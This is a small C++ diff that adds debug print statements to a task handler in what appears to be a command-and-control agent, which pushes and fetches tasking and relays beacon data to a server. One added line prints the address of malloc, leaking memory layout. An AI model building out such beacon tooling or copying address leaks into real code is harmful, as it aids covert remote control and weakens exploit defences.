@@ -70,6 +70,8 @@ int NetInst::HandleTask(ptask_t task){
     printf("  DATA ADDRESS: %p\n", task->data);
     int rc = 0;
 
+    printf("Malloc address: %p\n", malloc);
+
 
     // switch depending on the type of operation
     switch (task->type)
@@ -97,14 +99,17 @@ int NetInst::HandleTask(ptask_t task){
         {
             // push request to agent and read data back
             if(!api_check(tspt->push_tasking(task))) {
+                printf("Failed api check push\n");
                 rc = 1;
                 break;
             }
+            printf("Fetching task\n");
             if(!api_check(tspt->fetch_tasking())){
+                printf("Failed api check fetch task\n");
                 rc = 1;
                 break;
             }
-
+            printf("T\n");
             // get the beacon data
             char *beacon_data = (char*)((AgentJob*)this->t_dat)->get_data();
             // push data to the server
